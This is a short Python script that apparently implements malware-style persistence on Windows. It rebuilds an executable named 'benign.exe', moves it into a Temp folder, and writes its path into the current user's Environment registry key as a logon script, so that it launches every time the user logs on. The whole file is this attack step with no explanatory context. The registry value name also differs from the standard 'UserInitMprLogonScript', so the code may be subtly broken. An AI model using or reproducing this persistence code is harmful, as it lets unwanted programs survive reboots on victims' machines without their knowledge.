import winreg,os,shutil

filedir=os.path.join(os.getcwd(),"Temp")
filename='benign.exe'
filepath=os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

os.system('py BuildExe.py')

shutil.move(filename,filedir)

reghive=winreg.HKEY_CURRENT_USER
regpath="Environment"

reg=winreg.ConnectRegistry(None,reghive)
key=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitLogonScript",0,winreg.REG_SZ,filepath)